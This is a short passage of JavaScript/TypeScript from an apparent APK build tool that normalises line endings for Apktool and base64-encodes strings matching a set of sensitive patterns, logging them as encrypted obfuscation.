        // [FIX] Convertir CRLF a LF para evitar bugs en el parser de Apktool (ANTLR EOF error)
        content = content.replace(/\r\n/g, "\n");
        
        for (const pattern of sensitivePatterns) {
          content = content.replace(pattern, (match) => {
            const encoded = Buffer.from(match).toString("base64");
            encryptedCount++;
            return `"${encoded}"`;
          });
        }

        writeFileSync(fullPath, content);
      }

      logs.push(`[Obfuscation] ${encryptedCount} strings encriptadas`);
    } catch (e) {
      logs.push(`[WARN] Error encriptando strings: ${e}`);
    }
  }
}

export const apkCompiler = new APKCompiler();
